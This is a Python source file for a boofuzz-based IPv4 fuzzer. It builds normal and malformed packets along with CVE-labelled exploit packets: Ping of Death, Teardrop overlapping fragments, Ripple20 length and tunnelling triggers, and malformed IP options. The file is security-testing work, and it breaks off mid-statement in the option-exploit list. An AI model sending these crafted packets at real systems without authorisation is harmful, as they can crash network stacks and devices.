"""IPv4 Protocol Fuzzer

Optimized test ordering for maximum early coverage and crash detection:
- Phase 1: Quick feature sweep (all packet types once) ~30 sec
- Phase 2: High-crash tests (fragment exploits, option exploits) ~3 min
- Phase 3: CVE-targeted operations (known vulnerabilities) ~3 min
- Phase 4: Boundary attacks and validation tests ~2 min
- Phase 5: Standard packet types and remaining tests

CVE Coverage:
- CVE-1999-0128 (Ping of Death)
- CVE-1997-0124 (Teardrop)
- CVE-2019-12256 (IPnet option parsing)
- CVE-2020-11896 (Ripple20 - Treck TCP/IP)
- CVE-2020-11900 (Ripple20 - double free)
- CVE-2020-11909 (Ripple20 - improper validation)
"""

import struct
from typing import List

from boofuzz import Block, Byte, Checksum, DWord, Group, Request, Size, Static, Word

from ..core.base_fuzzer import BaseFuzzer, RequestInfo
from ..core.config import FuzzerConfig, ProtocolType
from ..primitives.dynamic import SmartBytes, SmartString


class IPv4Fuzzer(BaseFuzzer):
    """IPv4 Protocol Fuzzer for IP layer security testing

    Test ordering is optimized for breadth-first coverage with high-crash
    tests prioritized early. Critical CVEs are tested within first 3 minutes.
    """

    PROTOCOL_OPTIONS = {
        "ttl": {"type": int, "default": 64, "description": "Time to Live", "example": "128"},
        "protocol": {
            "type": int,
            "default": 6,
            "description": "IP protocol number (6=TCP, 17=UDP, 1=ICMP)",
            "choices": [1, 6, 17, 41, 47, 50, 51, 58, 89, 132],
            "example": "17",
        },
        "source_ip": {
            "type": str,
            "default": "192.168.1.100",
            "description": "Source IP address",
            "example": "10.0.0.1",
        },
        "dest_ip": {
            "type": str,
            "default": None,
            "description": "Destination IP address (default: target IP)",
            "example": "10.0.0.2",
        },
        "source_mac": {
            "type": str,
            "default": "00:11:22:33:44:55",
            "description": "Source MAC address",
            "example": "aa:bb:cc:dd:ee:ff",
        },
        "dest_mac": {
            "type": str,
            "default": "ff:ff:ff:ff:ff:ff",
            "description": "Destination MAC address",
            "example": "00:00:00:00:00:01",
        },
        "include_ethernet": {
            "type": bool,
            "default": True,
            "description": "Include Ethernet header for raw sockets",
            "example": "false",
        },
        "include_options": {
            "type": bool,
            "default": False,
            "description": "Include IP options",
            "example": "true",
        },
        "fragment": {
            "type": bool,
            "default": False,
            "description": "Enable fragmentation fuzzing",
            "example": "true",
        },
        "tos": {
            "type": int,
            "default": 0,
            "description": "Type of Service / DSCP byte",
            "example": "184",
        },
        "identification": {
            "type": int,
            "default": 1,
            "description": "IP identification field",
            "example": "12345",
        },
        "vlan_id": {
            "type": int,
            "default": None,
            "description": "VLAN ID for 802.1Q tagging",
            "example": "100",
        },
    }

    @classmethod
    def get_request_definitions(cls) -> List[RequestInfo]:
        """Get static request definitions for --list-requests"""
        return [
            # Phase 1: Quick Coverage
            RequestInfo(
                "IPv4_Quick_Coverage", "Quick sweep: all packet types once (~30 sec)", "baseline"
            ),
            # Phase 2: High-crash CVE exploits (prioritized early)
            RequestInfo(
                "IPv4_Fragment_Exploits",
                "Fragment attacks: Ping of Death, Teardrop (CVE-1999-0128, CVE-1997-0124)",
                "exploit",
            ),
            RequestInfo(
                "IPv4_Option_Exploits", "Option parsing attacks (CVE-2019-12256 pattern)", "exploit"
            ),
            RequestInfo(
                "IPv4_Integer_Exploits", "Integer overflow and underflow attacks", "exploit"
            ),
            RequestInfo(
                "IPv4_Ripple20_Attacks",
                "Treck TCP/IP CVE attacks (CVE-2020-11896/11900/11909)",
                "exploit",
            ),
            # Phase 3: Boundary and validation tests
            RequestInfo(
                "IPv4_State_Attacks",
                "State confusion: Land attack, broadcast, loopback",
                "boundary",
            ),
            RequestInfo("IPv4_Corrupted_Checksum", "Checksum validation bypass tests", "boundary"),
            RequestInfo("IPv4_Incorrect_Length", "Length field validation attacks", "boundary"),
            RequestInfo("IPv4_Malformed", "Malformed packet structure tests", "boundary"),
            # Phase 4: Standard packet types
            RequestInfo("IPv4_Basic", "Basic IPv4 packet fuzzing", "protocol"),
            RequestInfo("IPv4_TCP", "IPv4 with TCP payload", "protocol"),
            RequestInfo("IPv4_UDP", "IPv4 with UDP payload", "protocol"),
            RequestInfo("IPv4_ICMP", "IPv4 with ICMP payload", "protocol"),
            # Phase 5: Optional extended tests
            RequestInfo(
                "IPv4_With_Options",
                "IPv4 with IP options (requires --option include_options=true)",
                "extended",
            ),
            RequestInfo(
                "IPv4_Fragment_First",
                "First fragment test (requires --option fragment=true)",
                "extended",
            ),
            RequestInfo(
                "IPv4_Fragment_Middle",
                "Middle fragment test (requires --option fragment=true)",
                "extended",
            ),
            RequestInfo(
                "IPv4_Fragment_Last",
                "Last fragment test (requires --option fragment=true)",
                "extended",
            ),
        ]

    def __init__(self, config: FuzzerConfig, connection_factory=None):
        config.protocol_type = ProtocolType.RAW
        super().__init__(config, connection_factory)

    def _ip_to_bytes(self, ip_string):
        """Convert IP address string to bytes"""
        parts = ip_string.split(".")
        return bytes([int(p) for p in parts])

    def _mac_to_bytes(self, mac_string):
        """Convert MAC address string to bytes"""
        parts = mac_string.replace(":", "").replace("-", "")
        return bytes.fromhex(parts)

    def _create_ip_header_bytes(
        self,
        version_ihl,
        tos,
        total_length,
        identification,
        flags_frag,
        ttl,
        protocol,
        source_ip,
        dest_ip,
    ):
        """Create raw IP header bytes for exploit payloads"""
        return struct.pack(
            ">BBHHHBBH4s4s",
            version_ihl,
            tos,
            total_length,
            identification,
            flags_frag,
            ttl,
            protocol,
            0,
            self._ip_to_bytes(source_ip),
            self._ip_to_bytes(dest_ip),
        )

    def _define_protocol(self):
        """Define IPv4 protocol structure.

        Test ordering is optimized for maximum early coverage and crash detection:
        - Phase 1: Quick feature sweep (all packet types once) ~30 sec
        - Phase 2: High-crash tests (CVE fragment/option exploits) ~3 min
        - Phase 3: Ripple20 CVE attacks and state confusion ~2 min
        - Phase 4: Boundary attacks (checksum, length validation) ~2 min
        - Phase 5: Standard packet types and extended tests
        """
        # Get protocol options
        ttl = self.config.get_option("ttl", 64)
        protocol = self.config.get_option("protocol", 6)  # TCP by default
        source_ip = self.config.get_option("source_ip", "192.168.1.100")
        dest_ip = self.config.get_option("dest_ip", self.config.target_ip)
        source_mac = self.config.get_option("source_mac", "00:11:22:33:44:55")
        dest_mac = self.config.get_option("dest_mac", "ff:ff:ff:ff:ff:ff")
        include_ethernet = self.config.get_option("include_ethernet", True)
        include_options = self.config.get_option("include_options", False)
        fragment = self.config.get_option("fragment", False)
        tos = self.config.get_option("tos", 0)
        identification = self.config.get_option("identification", 1)
        vlan_id = self.config.get_option("vlan_id", None)

        # ==================== PHASE 1: QUICK COVERAGE (~30 sec) ====================
        # Touch all packet types once with minimal params for maximum breadth coverage
        # This ensures all major code paths are exercised within first 30 seconds
        ipv4_quick_coverage = Request(
            "IPv4_Quick_Coverage",
            children=(
                Group(
                    "packet_types",
                    values=[
                        # Basic IPv4 (protocol 6 = TCP)
                        self._create_ip_header_bytes(
                            0x45, 0, 40, 1, 0x4000, 64, 6, source_ip, dest_ip
                        )
                        + struct.pack(">HHIIBBHHH", 12345, 80, 1, 0, 0x50, 0x02, 8192, 0, 0),
                        # UDP packet (protocol 17)
                        self._create_ip_header_bytes(
                            0x45, 0, 28, 2, 0x4000, 64, 17, source_ip, dest_ip
                        )
                        + struct.pack(">HHHH", 54321, 53, 8, 0),
                        # ICMP Echo Request (protocol 1)
                        self._create_ip_header_bytes(
                            0x45, 0, 28, 3, 0x4000, 64, 1, source_ip, dest_ip
                        )
                        + struct.pack(">BBHHH", 8, 0, 0, 1, 1),
                        # IPv4 with options (IHL=6)
                        self._create_ip_header_bytes(
                            0x46, 0, 24, 4, 0x4000, 64, 6, source_ip, dest_ip
                        )
                        + b"\x01\x07\x03\x04",  # NOP + Record Route
                        # Fragment (MF=1, offset=0)
                        self._create_ip_header_bytes(
                            0x45, 0, 28, 5, 0x2000, 64, 17, source_ip, dest_ip
                        )
                        + b"FRAGMENT",
                        # Malformed (invalid version=0)
                        self._create_ip_header_bytes(
                            0x05, 0xFF, 20, 6, 0xFFFF, 0, 255, "0.0.0.0", "255.255.255.255"
                        ),
                        # TOS/DSCP variations
                        self._create_ip_header_bytes(
                            0x45, 0xB8, 40, 7, 0x4000, 64, 6, source_ip, dest_ip
                        )
                        + struct.pack(">HHIIBBHHH", 12345, 80, 1, 0, 0x50, 0x02, 8192, 0, 0),
                        # GRE encapsulation (protocol 47)
                        self._create_ip_header_bytes(
                            0x45, 0, 28, 8, 0x4000, 64, 47, source_ip, dest_ip
                        )
                        + struct.pack(">HH", 0, 0x0800),  # GRE header
                        # ESP (protocol 50) - IPsec
                        self._create_ip_header_bytes(
                            0x45, 0, 36, 9, 0x4000, 64, 50, source_ip, dest_ip
                        )
                        + struct.pack(">II", 0x12345678, 1),  # SPI + Sequence
                        # AH (protocol 51) - IPsec
                        self._create_ip_header_bytes(
                            0x45, 0, 32, 10, 0x4000, 64, 51, source_ip, dest_ip
                        )
                        + struct.pack(">BBHII", 6, 4, 0, 0x12345678, 1),
                    ],
                )
            ),
        )

        # Basic IPv4 packet with optional Ethernet header
        ipv4_basic = Request(
            "IPv4_Basic",
            children=(
                # Ethernet Header (if enabled)
                Block(
                    "Ethernet_Header",
                    children=(
                        SmartBytes("Dest_MAC", self._mac_to_bytes(dest_mac), size=6, fuzzable=True),
                        SmartBytes(
                            "Source_MAC", self._mac_to_bytes(source_mac), size=6, fuzzable=True
                        ),
                        # VLAN tag if specified
                        Block(
                            "VLAN_Tag",
                            children=(
                                Word("TPID", 0x8100, endian=">", fuzzable=False),  # 802.1Q
                                Word(
                                    "TCI", (vlan_id & 0x0FFF) | 0x2000, endian=">", fuzzable=True
                                ),  # PCP=0, DEI=0, VID
                            ),
                        )
                        if vlan_id is not None
                        else Static("", ""),
                        Word("EtherType", 0x0800, endian=">", fuzzable=True),  # IPv4
                    ),
                )
                if include_ethernet
                else Static("", ""),
                Block(
                    "IP_Header",
                    children=(
                        # Version (4) and IHL (5 for 20 bytes)
                        Byte("Version_IHL", 0x45, fuzzable=True),
                        # Type of Service / DSCP + ECN
                        Byte("TOS", tos, fuzzable=True),
                        # Total Length (dynamically calculated: IP header + payload)
                        Size(
                            "Total_Length",
                            block_name="Payload",
                            length=2,
                            endian=">",
                            inclusive=True,
                            offset=20,
                            fuzzable=False,
                        ),
                        # Identification
                        Word("Identification", identification, endian=">", fuzzable=True),
                        # Flags and Fragment Offset
                        Word(
                            "Flags_FragOffset", 0x4000, endian=">", fuzzable=True
                        ),  # Don't Fragment
                        # Time to Live
                        Byte("TTL", ttl, fuzzable=True),
                        # Protocol
                        Byte("Protocol", protocol, fuzzable=True),
                        # Header Checksum (calculated by boofuzz)
                        Checksum(
                            "Checksum",
                            block_name="IP_Header",
                            algorithm="ipv4",
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        # Source IP Address
                        SmartBytes(
                            "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=True
                        ),
                        # Destination IP Address
                        SmartBytes("Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=True),
                    ),
                ),
                # Payload (varies by protocol)
                Block(
                    "Payload",
                    children=(
                        SmartString("Data", "ipv4-payload-data", max_len=1480, fuzzable=True),
                    ),
                ),
            ),
        )

        # IPv4 with options
        if include_options:
            ipv4_with_options = Request(
                "IPv4_With_Options",
                children=(
                    Block(
                        "IP_Header",
                        children=(
                            # Version (4) and IHL (6+ for options)
                            Byte("Version_IHL", 0x46, fuzzable=True),
                            Byte("TOS", tos, fuzzable=True),
                            Word("Total_Length", 24, endian=">", fuzzable=True),
                            Word("Identification", identification + 1, endian=">", fuzzable=True),
                            Word("Flags_FragOffset", 0x4000, endian=">", fuzzable=True),
                            Byte("TTL", ttl, fuzzable=True),
                            Byte("Protocol", protocol, fuzzable=True),
                            Checksum(
                                "Checksum",
                                block_name="IP_Header",
                                algorithm="ipv4",
                                length=2,
                                endian=">",
                                fuzzable=False,
                            ),
                            SmartBytes(
                                "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=True
                            ),
                            SmartBytes(
                                "Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=True
                            ),
                            # IP Options
                            Block(
                                "Options",
                                children=(
                                    # NOP option
                                    Byte("NOP", 1, fuzzable=True),
                                    # Record Route option
                                    Byte("RR_Type", 7, fuzzable=True),
                                    Byte("RR_Length", 3, fuzzable=True),
                                    Byte("RR_Pointer", 4, fuzzable=True),
                                    # End of Options
                                    Byte("EOL", 0, fuzzable=True),
                                ),
                            ),
                        ),
                    ),
                    Block(
                        "Payload",
                        children=(
                            SmartString(
                                "Data", "ipv4-options-payload", max_len=1476, fuzzable=True
                            ),
                        ),
                    ),
                ),
            )

        # Fragmented IPv4 packets
        if fragment:
            # First fragment
            ipv4_fragment_1 = Request(
                "IPv4_Fragment_First",
                children=(
                    Block(
                        "IP_Header",
                        children=(
                            Byte("Version_IHL", 0x45, fuzzable=True),
                            Byte("TOS", tos, fuzzable=True),
                            Word("Total_Length", 28, endian=">", fuzzable=True),
                            Word("Identification", identification + 100, endian=">", fuzzable=True),
                            # More Fragments flag set, offset 0
                            Word("Flags_FragOffset", 0x2000, endian=">", fuzzable=True),
                            Byte("TTL", ttl, fuzzable=True),
                            Byte("Protocol", protocol, fuzzable=True),
                            Checksum(
                                "Checksum",
                                block_name="IP_Header",
                                algorithm="ipv4",
                                length=2,
                                endian=">",
                                fuzzable=False,
                            ),
                            SmartBytes(
                                "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=True
                            ),
                            SmartBytes(
                                "Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=True
                            ),
                        ),
                    ),
                    # First 8 bytes of data
                    Block(
                        "Fragment_Data",
                        children=(SmartBytes("Data", b"FRAGMENT1", size=8, fuzzable=True),),
                    ),
                ),
            )

            # Middle fragment
            ipv4_fragment_2 = Request(
                "IPv4_Fragment_Middle",
                children=(
                    Block(
                        "IP_Header",
                        children=(
                            Byte("Version_IHL", 0x45, fuzzable=True),
                            Byte("TOS", tos, fuzzable=True),
                            Word("Total_Length", 28, endian=">", fuzzable=True),
                            Word("Identification", identification + 100, endian=">", fuzzable=True),
                            # More Fragments flag set, offset 8
                            Word("Flags_FragOffset", 0x2001, endian=">", fuzzable=True),
                            Byte("TTL", ttl, fuzzable=True),
                            Byte("Protocol", protocol, fuzzable=True),
                            Checksum(
                                "Checksum",
                                block_name="IP_Header",
                                algorithm="ipv4",
                                length=2,
                                endian=">",
                                fuzzable=False,
                            ),
                            SmartBytes(
                                "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=True
                            ),
                            SmartBytes(
                                "Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=True
                            ),
                        ),
                    ),
                    Block(
                        "Fragment_Data",
                        children=(SmartBytes("Data", b"FRAGMENT2", size=8, fuzzable=True),),
                    ),
                ),
            )

            # Last fragment
            ipv4_fragment_3 = Request(
                "IPv4_Fragment_Last",
                children=(
                    Block(
                        "IP_Header",
                        children=(
                            Byte("Version_IHL", 0x45, fuzzable=True),
                            Byte("TOS", tos, fuzzable=True),
                            Word("Total_Length", 28, endian=">", fuzzable=True),
                            Word("Identification", identification + 100, endian=">", fuzzable=True),
                            # No More Fragments, offset 16
                            Word("Flags_FragOffset", 0x0002, endian=">", fuzzable=True),
                            Byte("TTL", ttl, fuzzable=True),
                            Byte("Protocol", protocol, fuzzable=True),
                            Checksum(
                                "Checksum",
                                block_name="IP_Header",
                                algorithm="ipv4",
                                length=2,
                                endian=">",
                                fuzzable=False,
                            ),
                            SmartBytes(
                                "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=True
                            ),
                            SmartBytes(
                                "Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=True
                            ),
                        ),
                    ),
                    Block(
                        "Fragment_Data",
                        children=(SmartBytes("Data", b"FRAGMENT3", size=8, fuzzable=True),),
                    ),
                ),
            )

        # IPv4 with various protocols
        # TCP payload
        ipv4_tcp = Request(
            "IPv4_TCP",
            children=(
                Block(
                    "IP_Header",
                    children=(
                        Byte("Version_IHL", 0x45, fuzzable=True),
                        Byte("TOS", tos, fuzzable=True),
                        Word("Total_Length", 40, endian=">", fuzzable=True),
                        Word("Identification", identification + 200, endian=">", fuzzable=True),
                        Word("Flags_FragOffset", 0x4000, endian=">", fuzzable=True),
                        Byte("TTL", ttl, fuzzable=True),
                        Byte("Protocol", 6, fuzzable=False),  # TCP
                        Checksum(
                            "Checksum",
                            block_name="IP_Header",
                            algorithm="ipv4",
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        SmartBytes(
                            "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=True
                        ),
                        SmartBytes("Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=True),
                    ),
                ),
                Block(
                    "TCP_Header",
                    children=(
                        Word("Source_Port", 12345, endian=">", fuzzable=True),
                        Word("Dest_Port", 80, endian=">", fuzzable=True),
                        DWord("Sequence", 1, endian=">", fuzzable=True),
                        DWord("Acknowledgment", 0, endian=">", fuzzable=True),
                        Byte("Data_Offset_Flags", 0x50, fuzzable=True),  # 5 * 4 = 20 bytes
                        Byte("Flags", 0x02, fuzzable=True),  # SYN
                        Word("Window", 8192, endian=">", fuzzable=True),
                        Word("TCP_Checksum", 0, endian=">", fuzzable=True),
                        Word("Urgent", 0, endian=">", fuzzable=True),
                    ),
                ),
            ),
        )

        # UDP payload
        ipv4_udp = Request(
            "IPv4_UDP",
            children=(
                Block(
                    "IP_Header",
                    children=(
                        Byte("Version_IHL", 0x45, fuzzable=True),
                        Byte("TOS", tos, fuzzable=True),
                        Word("Total_Length", 28, endian=">", fuzzable=True),
                        Word("Identification", identification + 300, endian=">", fuzzable=True),
                        Word("Flags_FragOffset", 0x4000, endian=">", fuzzable=True),
                        Byte("TTL", ttl, fuzzable=True),
                        Byte("Protocol", 17, fuzzable=False),  # UDP
                        Checksum(
                            "Checksum",
                            block_name="IP_Header",
                            algorithm="ipv4",
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        SmartBytes(
                            "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=True
                        ),
                        SmartBytes("Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=True),
                    ),
                ),
                Block(
                    "UDP_Header",
                    children=(
                        Word("Source_Port", 54321, endian=">", fuzzable=True),
                        Word("Dest_Port", 53, endian=">", fuzzable=True),
                        Word("Length", 8, endian=">", fuzzable=True),
                        Word("UDP_Checksum", 0, endian=">", fuzzable=True),
                    ),
                ),
            ),
        )

        # ICMP payload
        ipv4_icmp = Request(
            "IPv4_ICMP",
            children=(
                Block(
                    "IP_Header",
                    children=(
                        Byte("Version_IHL", 0x45, fuzzable=True),
                        Byte("TOS", tos, fuzzable=True),
                        Word("Total_Length", 28, endian=">", fuzzable=True),
                        Word("Identification", identification + 400, endian=">", fuzzable=True),
                        Word("Flags_FragOffset", 0x4000, endian=">", fuzzable=True),
                        Byte("TTL", ttl, fuzzable=True),
                        Byte("Protocol", 1, fuzzable=False),  # ICMP
                        Checksum(
                            "Checksum",
                            block_name="IP_Header",
                            algorithm="ipv4",
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        SmartBytes(
                            "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=True
                        ),
                        SmartBytes("Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=True),
                    ),
                ),
                Block(
                    "ICMP_Header",
                    children=(
                        Byte("Type", 8, fuzzable=True),  # Echo Request
                        Byte("Code", 0, fuzzable=True),
                        Word("ICMP_Checksum", 0, endian=">", fuzzable=True),
                        Word("Identifier", 1, endian=">", fuzzable=True),
                        Word("Sequence", 1, endian=">", fuzzable=True),
                    ),
                ),
            ),
        )

        # Malformed packets
        ipv4_malformed = Request(
            "IPv4_Malformed",
            children=(
                Block(
                    "IP_Header",
                    children=(
                        # Invalid version
                        Byte("Version_IHL", 0x05, fuzzable=True),  # Version 0, IHL 5
                        Byte("TOS", 0xFF, fuzzable=True),
                        Word("Total_Length", 10, endian=">", fuzzable=True),  # Too small
                        Word("Identification", 0xFFFF, endian=">", fuzzable=True),
                        Word("Flags_FragOffset", 0xFFFF, endian=">", fuzzable=True),
                        Byte("TTL", 0, fuzzable=True),  # Zero TTL
                        Byte("Protocol", 255, fuzzable=True),  # Reserved protocol
                        Word(
                            "Checksum", 0xFFFF, endian=">", fuzzable=True
                        ),  # Intentionally bad checksum
                        SmartBytes("Source_IP", b"\x00\x00\x00\x00", size=4, fuzzable=True),
                        SmartBytes("Dest_IP", b"\xff\xff\xff\xff", size=4, fuzzable=True),
                    ),
                ),
            ),
        )

        # Corrupted Checksum Test - tests checksum validation logic
        ipv4_corrupted_checksum = Request(
            "IPv4_Corrupted_Checksum",
            children=(
                Block(
                    "IP_Header_BadChecksum",
                    children=(
                        Byte("Version_IHL", 0x45, fuzzable=False),
                        Byte("TOS", tos, fuzzable=False),
                        Word("Total_Length", 20, endian=">", fuzzable=False),
                        Word("Identification", identification + 500, endian=">", fuzzable=False),
                        Word("Flags_FragOffset", 0x4000, endian=">", fuzzable=False),
                        Byte("TTL", ttl, fuzzable=False),
                        Byte("Protocol", protocol, fuzzable=False),
                        # Intentionally corrupted checksums to test validation
                        Group(
                            "Bad_Checksum",
                            values=[
                                b"\x00\x00",  # Zero checksum
                                b"\xff\xff",  # All ones
                                b"\x12\x34",  # Random wrong value
                                b"\xab\xcd",  # Another wrong value
                            ],
                        ),
                        SmartBytes(
                            "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=False
                        ),
                        SmartBytes("Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=False),
                    ),
                ),
                Block(
                    "Payload",
                    children=(
                        SmartString("Data", "corrupted-checksum-test", max_len=100, fuzzable=False),
                    ),
                ),
            ),
        )

        # Incorrect Length Test - tests length field validation logic
        ipv4_incorrect_length = Request(
            "IPv4_Incorrect_Length",
            children=(
                Block(
                    "IP_Header_BadLength",
                    children=(
                        Byte("Version_IHL", 0x45, fuzzable=False),
                        Byte("TOS", tos, fuzzable=False),
                        # Intentionally incorrect length values to test parser validation
                        Group(
                            "Bad_Length",
                            values=[
                                b"\x00\x10",  # 16 bytes (less than minimum 20)
                                b"\x00\x14",  # 20 bytes (header only, but we have payload)
                                b"\xff\xff",  # 65535 bytes (maximum value, way too large)
                                b"\x00\x00",  # 0 bytes (invalid)
                                b"\x00\x0a",  # 10 bytes (way too small)
                            ],
                        ),
                        Word("Identification", identification + 600, endian=">", fuzzable=False),
                        Word("Flags_FragOffset", 0x4000, endian=">", fuzzable=False),
                        Byte("TTL", ttl, fuzzable=False),
                        Byte("Protocol", protocol, fuzzable=False),
                        Checksum(
                            "Checksum",
                            block_name="IP_Header_BadLength",
                            algorithm="ipv4",
                            length=2,
                            endian=">",
                            fuzzable=False,
                        ),
                        SmartBytes(
                            "Source_IP", self._ip_to_bytes(source_ip), size=4, fuzzable=False
                        ),
                        SmartBytes("Dest_IP", self._ip_to_bytes(dest_ip), size=4, fuzzable=False),
                    ),
                ),
                Block(
                    "Payload",
                    children=(
                        SmartString("Data", "incorrect-length-test", max_len=100, fuzzable=False),
                    ),
                ),
            ),
        )

        # Ripple20 CVE attacks (Treck TCP/IP Stack vulnerabilities)
        # CVE-2020-11896: Length inconsistency in IPv4/UDP
        # CVE-2020-11900: Double free in IPv4 tunneling
        # CVE-2020-11909: Improper validation in IPv4
        ipv4_ripple20_attacks = Request(
            "IPv4_Ripple20_Attacks",
            children=(
                Group(
                    "ripple20_exploits",
                    values=[
                        # CVE-2020-11896: IPv4/UDP length inconsistency
                        # UDP length field doesn't match IP total length
                        self._create_ip_header_bytes(
                            0x45, 0, 28, 0xABCD, 0x4000, 64, 17, source_ip, dest_ip
                        )
                        + struct.pack(">HHHH", 53, 53, 100, 0),  # UDP length=100 but IP says 28
                        # CVE-2020-11896 variant: Truncated UDP in fragment
                        self._create_ip_header_bytes(
                            0x45, 0, 24, 0xABCE, 0x2000, 64, 17, source_ip, dest_ip
                        )
                        + struct.pack(">HH", 53, 53),  # Incomplete UDP header in fragment
                        # CVE-2020-11900: IPv4-in-IPv4 tunneling double free trigger
                        # Encapsulated packet with malformed inner header
                        self._create_ip_header_bytes(
                            0x45, 0, 48, 0xDEAD, 0x4000, 64, 4, source_ip, dest_ip
                        )
                        + self._create_ip_header_bytes(
                            0x45, 0, 10, 0xBEEF, 0x4000, 64, 6, source_ip, dest_ip
                        )
                        + b"INNER_DATA",
                        # CVE-2020-11900 variant: Nested fragments
                        self._create_ip_header_bytes(
                            0x45, 0, 48, 0xDEAE, 0x2000, 64, 4, source_ip, dest_ip
                        )
                        + self._create_ip_header_bytes(
                            0x45, 0, 28, 0xDEAF, 0x2001, 64, 17, source_ip, dest_ip
                        )
                        + b"NESTED",
                        # CVE-2020-11909: Improper IP validation - negative payload
                        self._create_ip_header_bytes(
                            0x45, 0, 19, 0xF00D, 0x4000, 64, 6, source_ip, dest_ip
                        ),
                        # CVE-2020-11909 variant: IHL > total length
                        self._create_ip_header_bytes(
                            0x4F, 0, 40, 0xF00E, 0x4000, 64, 6, source_ip, dest_ip
                        )
                        + b"X" * 20,
                        # Additional Ripple20-style: ICMP with embedded malformed IP
                        self._create_ip_header_bytes(
                            0x45, 0, 56, 0xCCCC, 0x4000, 64, 1, source_ip, dest_ip
                        )
                        + struct.pack(
                            ">BBHBBHHH", 3, 4, 0, 0, 0, 0, 0, 0
                        )  # ICMP Destination Unreachable
                        + self._create_ip_header_bytes(
                            0x45, 0, 10, 0xDDDD, 0x4000, 64, 6, source_ip, dest_ip
                        ),
                        # IPnet-style: Malformed GRE tunnel (CVE-2019-12256 pattern)
                        self._create_ip_header_bytes(
                            0x46, 0, 32, 0xEEEE, 0x4000, 64, 47, source_ip, dest_ip
                        )
                        + b"\x83\xff\x00\x00"  # Malformed IP option
                        + struct.pack(">HH", 0, 0x0800),  # GRE header
                    ],
                )
            ),
        )

        # Fragment-based vulnerability exploits
        ipv4_fragment_exploits = Request(
            "IPv4_Fragment_Exploits",
            children=(
                Group(
                    "fragment_attacks",
                    values=[
                        # Ping of Death - Fragment with max offset + 8 bytes data (CVE-1999-0128)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            28,
                            0x1234,
                            0x3FFF,
                            64,
                            1,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"PINGDEATH",
                        # Teardrop attack - Overlapping fragments (CVE-1997-0124)
                        # Fragment 1: offset 0, length 40
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            60,
                            0x1111,
                            0x2000,
                            64,
                            17,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"A" * 40,
                        # Fragment 2: offset 20, length 20 (overlaps)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            40,
                            0x1111,
                            0x0014,
                            64,
                            17,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"B" * 20,
                        # Fragment exceeding 65535 bytes when reassembled
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            1500,
                            0x2222,
                            0x3FF8,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"X" * 1480,
                        # Zero-length fragment edge case
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            20,
                            0x6666,
                            0x2000,
                            64,
                            1,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        ),
                        # Fragment with reserved flag set (RFC violation)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            100,
                            0x7777,
                            0x8000,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"reserved_flag",
                        # Minimum MTU fragment (68 bytes) exploitation
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            68,
                            0x8888,
                            0x2000,
                            64,
                            17,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"A" * 48,
                        # Fragment with offset at exact boundary (8188*8 = 65504)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x45,
                            0,
                            51,
                            0x9999,
                            0x1FFC,
                            64,
                            1,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"boundary" * 4,
                    ],
                )
            ),
        )

        # IPv4 Option Processing Exploits
        ipv4_option_exploits = Request(
            "IPv4_Option_Exploits",
            children=(
                Group(
                    "option_attacks",
                    values=[
                        # Excessive options causing 60-byte header (max allowed)
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x4F,
                            0,
                            80,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"\x94\x04\x00\x00" * 15,  # 15 timestamp options (60 bytes)
                        # Malformed loose source route with invalid length
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x46,
                            0,
                            28,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
                            self._ip_to_bytes(dest_ip),
                        )
                        + b"\x83\xff\x00\x00",  # Option 131 with length 255 (invalid)
                        # Record route option pointing beyond header
                        struct.pack(
                            ">BBHHHBBH4s4s",
                            0x48,
                            0,
                            52,
                            0,
                            0,
                            64,
                            6,
                            0,
                            self._ip_to_bytes(source_ip),
